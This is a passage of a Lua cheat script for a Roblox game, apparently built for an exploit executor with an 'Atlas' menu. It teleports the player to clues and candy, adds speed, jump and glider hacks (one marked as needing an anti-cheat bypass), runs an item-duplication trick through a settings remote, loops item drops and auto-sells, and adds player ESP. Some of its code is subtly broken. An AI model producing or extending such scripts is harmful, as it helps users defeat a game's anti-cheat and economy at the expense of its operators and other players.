                    if currentclue.Text == riddle.Riddle then
                        CLUETYPE = riddle.Name
                    end
                end
            end
            if CLUETYPE ~= nil then
                for _, clue in pairs(Workspace:GetDescendants()) do
                    if clue.Name == CLUETYPE then
                        if clue:IsA('Model') then
                            if clue.PrimaryPart ~= nil then
                                table.insert(cluetable, clue.PrimaryPart.Position)
                            end
                        else
                            table.insert(cluetable, clue.Position)
                        end
                    end
                end
            end
            if cluetable[1] ~= nil then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(cluetable[1] + Vector3.new(0, 20, 0))
                    return true
                end
            else
                MakeAtlasNotification("Clue not found", 'Your clue is not on the map', 3)
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

TreasureTab:AddButton({
    Name = 'Clue is an image',
    Callback = function()
        local Steps = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('Clues'):WaitForChild('Steps'))
        local CurrentClueImage = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('ImageLabel').Image
        local loadout = LocalPlayer:WaitForChild('PlayerGui'):WaitForChild('Menus')["Clue Scroll"]:FindFirstChild('Content'):FindFirstChild('Loadout').Text
        local IMAGES = {};
        local CLUELOCATION = nil;
        local loadoutsubbed = string.gsub(loadout, 'Must wear: ', '')
        
        function TrackClueImage()
            local function CheckImage()
                for _, image in pairs(Steps) do
                    if image.Image then
                        if CurrentClueImage == image.Image then
                            CLUELOCATION = image.Location
                            return true
                        end
                    end
                end
                return false
            end
            
            if CheckImage() then
                if IsPlayerAlive(LocalPlayer) then
                    LocalPlayer.Character:WaitForChild('HumanoidRootPart').CFrame = CFrame.new(CLUELOCATION + Vector3.new(0, 15, 0))
                    if not LocalPlayer.Character:FindFirstChild('Shovel') then
                        RemoteEvents['InventoryInteraction']:FireServer(169, 'Equip')
                    end
                    task.wait(0.4)
                    RemoteEvents['ToolAction']:FireServer(CLUELOCATION)
                    return true
                end
            else
                return false
            end
        end
        if TrackClueImage() then
            MakeAtlasNotification('Must wear(if so):', loadoutsubbed, 7)
        end
    end
})

local BumpUpChestSection = Chests:CreateSection('')

local LocalPlayerTab = LPlayer:CreateSection('Player Modifications')

LocalPlayerTab:AddToggle({
    Name = 'Inf-Jump',
    Default = false,
    Flag = 'InfJump',
    Callback = function(Value)
        getgenv().configs.InfJump = Value
        InfJump()
	end
})

LocalPlayerTab:AddToggle({
    Name = 'Anti-Ragdoll',
    Default = false,
    Flag = 'AntiRagDoll',
    Callback = function(Value)
        getgenv().configs.AntiRagDoll = Value
        if getgenv().configs.AntiRagDoll then
            if not getgenv().RagDollBypass then
                getgenv().RagDollBypass = LocalPlayer.Character:WaitForChild('Humanoid').StateChanged:Connect(function(state)
                    if not getgenv().configs.AntiRagDoll then
                        getgenv().RagDollBypass:Disconnect()
                        getgenv().RagDollBypass = nil
                        return
                    end
                    if IsPlayerAlive(LocalPlayer) then
                        if LocalPlayer.Character:WaitForChild('Humanoid'):GetState() == Enum.HumanoidStateType.Physics then
                            LocalPlayer.Character.Humanoid:ChangeState(2)
                        end
                    end
                end)
            end
        else
            if getgenv().RagDollBypass then
                getgenv().RagDollBypass:Disconnect()
                getgenv().RagDollBypass = nil
            end
        end
	end
})

LocalPlayerTab:AddBind({
    Name = 'QuickSpeed',
	Default = Enum.KeyCode.B,
	Hold = false,
    Callback = function(key)
        getgenv().QuickSpeedKey = key
    end,
    KeyPressed = function()
        while UserInputService:IsKeyDown(getgenv().QuickSpeedKey) and not UserInputService:GetFocusedTextBox() do
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection * (getgenv().QuickSpeedMultiplier*.50))
                end
            end
        end
    end
})

LocalPlayerTab:CreateSlider({
    Name = 'QuickSpeed multiplier',
    Min = 1,
	Max = 20,
	Default = 1,
	Digits = 0,
    Flag = 'QuickSpeedMultiplier',
	Callback = function(Value)
		getgenv().QuickSpeedMultiplier = Value
	end     
})

LocalPlayerTab:CreateSlider({
    Name = 'Swim Speed',
    Min = 10,
	Max = 100,
	Default = 14,
	Digits  = 0,
    Flag = 'SwimSpeed',
	Callback = function(Value)
		local Constants = require(ReplicatedStorage:WaitForChild('References'):WaitForChild('SharedData'):WaitForChild('CONSTANTS'))
		Constants.WALK_SPEEDS.SWIM = Value
	end 
})

LocalPlayerTab:AddToggle({
    Name = 'Jump Power',
    Default = false,
    Flag = 'JumpPower',
    Callback = function(Value)
       getgenv().configs.JumpPower = Value 
       JumpPower()
    end
})

LocalPlayerTab:AddToggle({
    Name = 'Springy Boots Jump Power',
    Default = false,
    Flag = 'SpringyBootsJumpPower',
    Callback = function(Value)
       getgenv().configs.SpringyPower = Value 
       SpringyPower()
    end
})

LocalPlayerTab:AddToggle({
    Name = 'SpringyEaster Jump Power',
    Default = false,
    Flag = 'SpringyEasterJumpPower',
    Callback = function(Value)
       getgenv().configs.SpringyEasterPower = Value 
       SpringyEasterPower()
    end
})

LocalPlayerTab:AddToggle({
    Name = 'Sneaky Speed',
    Default = false,
    Flag = 'SneakySpeed',
    Callback = function(Value)
        getgenv().configs.ExtraSpeed = Value 
       ExtraSpeed()
    end
})

LocalPlayerTab:AddToggle({
    Name = 'Candy Speed',
    Default = false,
    Flag = 'Candy Speed',
    Callback = function(Value)
        getgenv().configs.CandySpeed = Value 
       CandySpeed()
    end
})

LocalPlayerTab:AddToggle({
    Name = 'Slightly Faster Than Candy Speed(You Need AC Bypass for this)',
    Default = false,
    Flag = 'Slightly Faster Than Candy Speed',
    Callback = function(Value)
        getgenv().configs.FasterSpeed = Value 
       FasterSpeed()
    end
})

local LocalPlayerTab = LPlayer:CreateSection('Misc Mods')

LocalPlayerTab:AddButton({
    Name = 'Get Map Candy(Op)',
    Callback = function()
        function GetCandy()
            for _, candy in pairs(Workspace:GetDescendants()) do
                if candy.Name == 'Candy' then
                    repeat task.wait()
                        local CandyPos = candy:GetPivot().Position
                        if IsPlayerAlive(LocalPlayer) then
                            if candy.Parent then
                                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(CandyPos + Vector3.new(0, 2, 0))
                                RemoteEvents['ItemInteracted']:FireServer(candy, "Pickup")
                            end
                        end
                    until not candy.Parent or not IsPlayerAlive(LocalPlayer)
                end
            end
        end
        GetCandy()
        if not Workspace:FindFirstChild('Candy', true) then
            MakeAtlasNotification('No Candies left/found', 'No candies left in the map', 3)
        end
    end
})

if MyInventory:FindFirstChild("Glider") or MyInventory:FindFirstChild("Easter Glider") then
    LocalPlayerTab:CreateSliderToggle({
        Name = "Mod Glider Speed",
        Min = 30,
        Max = 300,
        SliderDefault = 30,
        Digits = 0,
        ToggleDefault = false,
        SliderFlag = "GliderModSpeed",
        ToggleFlag = "GliderModSpeedToggle",
        SliderCallback = function(Value) 
            getgenv().GliderModSpeed = Value
        end,
        ToggleCallback = function(Value)
            local GliderModule = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('ToolController'):WaitForChild('ToolObject'):WaitForChild('Controllers'):WaitForChild('Glider'))
            if Value == true then
                setconstant(GliderModule.Step, 9, tonumber(getgenv().GliderModSpeed))
            else
                setconstant(GliderModule.Step, 9, 30)
            end
        end
    })
end

LocalPlayerTab:AddButton({
    Name = 'Restore Candy Mesh(not invisible)',
    Callback = function()
        local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
        for _, candy in pairs(Workspace:GetDescendants()) do
            if candy.Name == 'Candy' and candy:FindFirstChildOfClass('MeshPart') then
                candy.PrimaryPart.MeshId = 'rbxassetid://4018923852'
            end
        end
        if not getgenv().CandyAdded then
            getgenv().CandyAdded = Workspace:WaitForChild('Replicators')[CheckPassiveOrNonPassive].ChildAdded:Connect(function(candie)
                task.wait(0.1)
                if candie.Name == 'Pile of Candy' then
                    for _, multicandy in pairs(candie:FindFirstChildOfClass('Model'):GetChildren()) do
                        multicandy.MeshId = 'rbxassetid://4018923852'
                    end
                elseif candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
                end
            end)
            getgenv().CandyAdded2 = Workspace.ChildAdded:Connect(function(candie)
                task.wait(0.1)
                if candie.Name == 'Candy' and candie:FindFirstChildOfClass('MeshPart') then
                    candie.PrimaryPart.MeshId = 'rbxassetid://4018923852'
                end
            end)
        end
        MakeAtlasNotification('Restored mesh', 'Candies should now be visible', 3)
    end
})

LocalPlayerTab:AddButton({
    Name = 'Drive in water',
    Callback = function()
        local Cart = require(LocalPlayer:WaitForChild('PlayerScripts'):WaitForChild('Main'):WaitForChild('Vehicle'):WaitForChild('Cart'))
        Cart.TerrainCheck = function()
            return false 
        end
    end
})

LocalPlayerTab:AddTextbox({
    Name = 'Player Tp',
    DefaultText = '',
    PlaceholderText = 'Username here',
    ClearTextOnFocus = true,
    Flag = 'PlayerTpTextbox',
    Callback = function(Value)
        if Value == "" then return end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if string.find(plr.Name:lower(), Value:lower()) or string.find(plr.DisplayName:lower(), Value:lower()) then
                    if IsPlayerAlive(LocalPlayer) and IsPlayerAlive(plr) then
                        local targetpos = plr.Character.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart.Position
                        myroot.CFrame = CFrame.new(targetpos)
                        MakeAtlasNotification('Success', 'Tped to: '..plr.Name, 3)
                    end
                end
            end
        end
    end
})

DupeTab:AddButton({
    Name = 'Stop data(dupe)',
    Callback = function(Value)
        RemoteEvents['SetSettings']:FireServer(Workspace)
		MakeAtlasNotification('Data Stopped', 'Drop anything you want :)', 5)
    end
})

DupeTab:AddButton({
    Name = 'Rejoin Current Server',
    Callback = function(Value)
		MakeAtlasNotification('Rejoining', 'Rejoining the server', 1)
        TeleportService:Teleport(game.PlaceId, LocalPlayer)
    end
})

DupeTab:AddTextbox({
    Name = 'Loop Item Drop Name:',
    DefaultText = '',
    PlaceholderText = 'Inventory Item',
    ClearTextOnFocus = true,
    Flag = 'RepeatDropInventoryItem',
    Callback = function(args)
        if args == "" then return end
        for _, item in pairs(MyInventory:GetChildren()) do
            if string.find(item.Name:lower(), args:lower()) then
                ItemIndexed = item
                return MakeAtlasNotification('Item Selected:', item.Name, 3)
            else
                ItemIndexed = nil
				ItemIndexedNumber = nil
            end
        end
        return MakeAtlasNotification('Invalid Item', 'Item not found', 3)
    end
})

DupeTab:AddToggle({
    Name = 'Loop Item Drop',
    Default = false,
    Flag = 'LoopDropItem',
    Callback  = function(Value)
        getgenv().configs.AmountToLoopDrop = Value
        if getgenv().configs.AmountToLoopDrop == true then
            if ItemIndexed and ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel') then
                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                repeat task.wait()
                    if IsPlayerAlive(LocalPlayer) then
                        if ItemIndexed.Parent then
                            if ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+') == nil then
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            else
                                ItemIndexedNumber = ItemIndexed:FindFirstChild('Top'):FindFirstChild('NameLabel').Text:match('%d+')
                                RemoteEvents['InventoryInteraction']:FireServer(SWITCHEDITEMSTABLE[ItemIndexed.Name], 'Drop')
                            end
                        end
                    end
                until not ItemIndexed.Parent or not getgenv().configs.AmountToLoopDrop or not IsPlayerAlive(LocalPlayer)
            end
        end
    end
})

local AutoSellTab = AutoSell:CreateSection('AutoSell (This does not account for pet token multipliers)')

AutoSellTab:AddToggle({
    Name = '4 Silver Bar = 1 Token',
    Default = false,
    Flag = 'SellSilverBar',
    Callback = function(Value)
        _G.SellSilver = Value
        while _G.SellSilver and task.wait(0.5) do
            if _G.SellSilver then
                SellItem('Silver Bar', 4, 14)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '4 Slime Ball = 1 Token',
    Default = false,
    Flag = 'SellSlimeBall',
    Callback = function(Value)
        _G.SellSlime = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem('Slime Ball', 40, 15)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '2 Gold Bar = 1 Token',
    Default = false,
    Flag = 'SellGoldBar',
    Callback = function(Value)
        _G.SellGold = Value
        while _G.SellSlime and task.wait(0.5) do
            if _G.SellSlime then
                SellItem("Gold Bar", 2, 16)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Ruby = 3 Token',
    Default = false,
    Flag = 'SellRuby',
    Callback = function(Value)
        _G.SellRuby = Value
        while _G.SellRuby and task.wait(0.5) do
            if _G.SellRuby then
                SellItem("Ruby", 1, 17)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Diamond = 4 Token',
    Default = false,
    Flag = 'SellDiamond',
    Callback = function(Value)
        _G.SellDiamonds = Value
        while _G.SellDiamonds and task.wait(0.5) do
            if _G.SellDiamonds then
                SellItem("Diamond", 1, 18)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Soul = 5 Token',
    Default = false,
    Flag = 'SellSoul',
    Callback = function(Value)
        _G.SellSouls = Value
        while _G.SellSouls and task.wait(0.5) do
            if _G.SellSouls then
                if getgenv().configs.UseSoulKeys then
                    SellItem("Soul", 11, 22)
                else
                    SellItem("Soul", 1, 22)
                end
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Zenyte = 6 Token',
    Default = false,
    Flag = 'SellZenyte',
    Callback = function(Value)
        _G.SellZenyte = Value
        while _G.SellZenyte and task.wait(0.5) do
            if _G.SellZenyte then
                SellItem("Zenyte", 1, 19)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Volcanic Ore = 15 Token',
    Default = false,
    Flag = 'SellVolcanicOre',
    Callback = function(Value)
        _G.SellVolcanicOre = Value
        while _G.SellVolcanicOre and task.wait(0.5) do
            if _G.SellVolcanicOre then
                SellItem("Volcanic Ore", 1, 23)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Obsidian = 20 Token',
    Default = false,
    Flag = 'SellObsidian',
    Callback = function(Value)
        _G.SellObsidian = Value
        while _G.SellObsidian and task.wait(0.5) do
            if _G.SellObsidian then
                SellItem("Obsidian", 1, 24)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Lunar Ore = 25 Token',
    Default = false,
    Flag = 'SellLunar',
    Callback = function(Value)
        _G.SellLunarOre = Value
        while _G.SellLunarOre and task.wait(0.5) do
            if _G.SellLunarOre then
                SellItem("Lunar Ore", 1, 25)
            end
        end
    end
})

AutoSellTab:AddToggle({
    Name = '1 Moonstone = 30 Token',
    Default = false,
    Flag = 'SellMoonstone',
    Callback = function(Value)
        _G.SellMoonstone = Value
        while _G.SellMoonstone and task.wait(0.5) do
            if _G.SellMoonstone then
                SellItem("Moonstone", 1, 26)
            end
        end
    end
})
AutoSellTab:AddButton({
    Name = 'Ruby Shield = 50 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 27)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Shield = 100 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 28)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Shield = 150 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 29)
    end
})


AutoSellTab:AddButton({
    Name = 'Obsidian Shield = 350 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 30)
    end
})

AutoSellTab:AddButton({
    Name = 'Ruby Helmet = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 31)
    end
})

AutoSellTab:AddButton({
    Name = 'Ruby Body = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 32)
    end
})

AutoSellTab:AddButton({
    Name = 'Ruby Legs = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 33)
    end
})

AutoSellTab:AddButton({
    Name = 'Ruby Boots = 15 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 34)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Helmet = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 35)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Body = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 36)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Legs = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 37)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Boots = 27 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 38)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Helmet = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 39)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Body = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 40)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Legs = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 41)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Boots = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 42)
    end
})

AutoSellTab:AddButton({
    Name = 'Obsidian Helmet = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 43)
    end
})

AutoSellTab:AddButton({
    Name = 'Obsidian Body = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 44)
    end
})

AutoSellTab:AddButton({
    Name = 'Obsidian Legs = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 45)
    end
})

AutoSellTab:AddButton({
    Name = 'Obsidian Boots = 115 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 46)
    end
})


AutoSellTab:AddButton({
    Name = 'Moostone Helmet = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 47)
    end
})

AutoSellTab:AddButton({
    Name = 'Moostone Body = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 48)
    end
})

AutoSellTab:AddButton({
    Name = 'Moostone Legs = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 49)
    end
})

AutoSellTab:AddButton({
    Name = 'Moostone Boots = 175 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 50)
    end
})

AutoSellTab:AddButton({
    Name = 'Springy Boots',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Armour Trader", 51)
    end
})
AutoSellTab:AddButton({
    Name = 'Silver Sword = 1 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 11)
    end
})

AutoSellTab:AddButton({
    Name = 'Gold Sword = 2 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 12)
    end
})

AutoSellTab:AddButton({
    Name = 'Gold Bow = 3 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 13)
    end
})

AutoSellTab:AddButton({
    Name = 'Ruby Sword = 10 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 14)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Sword = 18 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 15)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Sword = 30 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 17)
    end
})

AutoSellTab:AddButton({
    Name = 'Diamond Crossbow = 36 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 16)
    end
})

AutoSellTab:AddButton({
    Name = 'Zenyte Crossbow = 45 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 18)
    end
})

AutoSellTab:AddButton({
    Name = 'Obsidian Club = 80 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 19)
    end
})

AutoSellTab:AddButton({
    Name = 'Moonstone Sword = 130 Token',
    Callback = function()
        RemoteEvents['TradeTrader']:FireServer("Weapon Trader", 20)
    end
})

local EspSection = Visuals:CreateSection('Esp')

EspSection:AddToggle({
    Name = "Esp",
    Default = false,
    Flag = 'PlayerEsp',
    Callback = function(Value)
        getgenv().configs.PlayerEsp = Value
        PlayerEsp()
    end
})

-- Visuals Section
local VisualsTab = Visuals:CreateSection('Visuals')

VisualsTab:CreateSliderToggle({
	Name = "Time Of Day",
	Min = 0.1,
	Max = 24,
    Digits = 1,
	SliderDefault = Lighting.ClockTime,
    ToggleDefault = false,
    SliderFlag = 'TimeOfDay',
    ToggleFlag = 'ToggleTimeOfDay',
    SliderCallback = function(Value)
        _G.ClockTime = Value
        if _G.ToggleTimeOfDay then
            Lighting.ClockTime = _G.ClockTime
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleTimeOfDay = Value
        if _G.ClockTime and _G.ToggleTimeOfDay then
            Lighting.ClockTime = _G.ClockTime
        end
    end    
})

VisualsTab:CreateSliderToggle({
	Name = "Brightness",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting.Brightness,
    ToggleDefault = false,
    SliderFlag = 'Brightness',
    ToggleFlag = 'ToggleBrightness',
    SliderCallback = function(Value)
        _G.Brightness = Value
        if _G.ToggleBrightness then
            Lighting.Brightness = _G.Brightness
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleBrightness = Value
        if _G.Brightness and _G.ToggleBrightness then
            Lighting.Brightness = _G.Brightness
        end
    end    
})

VisualsTab:CreateSliderToggle({
	Name = "Saturation",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Saturation,
    ToggleDefault = false,
    SliderFlag = 'Saturation',
    ToggleFlag = 'ToggleSaturation',
    SliderCallback = function(Value)
        _G.Saturation = Value
        if _G.ToggleSaturation then
            Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleSaturation = Value
        if _G.Saturation and _G.ToggleSaturation then
            Lighting:WaitForChild('ColorCorrection').Saturation = _G.Saturation
        end
    end    
})

VisualsTab:CreateSliderToggle({
	Name = "Contrast",
	Min = 0.1,
	Max = 3,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('ColorCorrection').Contrast,
    ToggleDefault = false,
    SliderFlag = 'Contrast',
    ToggleFlag = 'ToggleContrast',
    SliderCallback = function(Value)
        _G.Contrast = Value
        if _G.ToggleContrast then
            Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleContrast = Value
        if _G.Contrast and _G.ToggleContrast then
            Lighting:WaitForChild('ColorCorrection').Contrast = _G.Contrast
        end
    end    
})

VisualsTab:CreateSliderToggle({
	Name = "Fog End",
	Min = 0.1,
	Max = 15,
    Digits = 1,
	SliderDefault = Lighting:WaitForChild('Atmosphere').Density,
    ToggleDefault = false,
    SliderFlag = 'FogEnd',
    ToggleFlag = 'ToggleFogEnd',
    SliderCallback = function(Value)
        _G.FogEnd = Value
        if _G.ToggleFogEnd then
            Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleFogEnd = Value
        if _G.FogEnd and _G.ToggleFogEnd then
            Lighting:WaitForChild('Atmosphere').Density = _G.FogEnd
        end
    end    
})

VisualsTab:CreateSliderToggle({
	Name = "Water Transparency",
	Min = 0,
	Max = 31,
    Digits = 1,
	SliderDefault = Workspace:WaitForChild('Terrain').WaterTransparency,
    ToggleDefault = false,
    SliderFlag = 'WaterTransparency',
    ToggleFlag = 'ToggleWaterTransparency',
    SliderCallback = function(Value)
        _G.WaterTransparency = Value
        if _G.ToggleWaterTransparency then
            Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
        end
    end,
	ToggleCallback = function(Value)
        _G.ToggleWaterTransparency = Value
        if _G.WaterTransparency and _G.ToggleWaterTransparency then
            Workspace:WaitForChild('Terrain').WaterTransparency = _G.WaterTransparency
        end
    end    
})

VisualsTab:CreateColorPicker({
    Name = 'Water Color',
    Default = Color3.fromRGB(Workspace:WaitForChild('Terrain').WaterColor.R*255, Workspace:WaitForChild('Terrain').WaterColor.G*255, Workspace:WaitForChild('Terrain').WaterColor.B*255),
    Flag = 'WaterColor',
    Callback = function(Value)
        if _G.ToggleWaterTransparency then
            Workspace:WaitForChild('Terrain').WaterColor = Value
        end
    end
})
CreditsTab:AddParagraph("zvvpe on discord (made all the functions besides a few i remade for this)TheRealGamer903#7339(on discord) (i discoverd the ACbypass and made it mobile compatable)")
CreditsTab:AddParagraph("Join the discord! [https://discord.gg/Hh5gUpcUpd]")



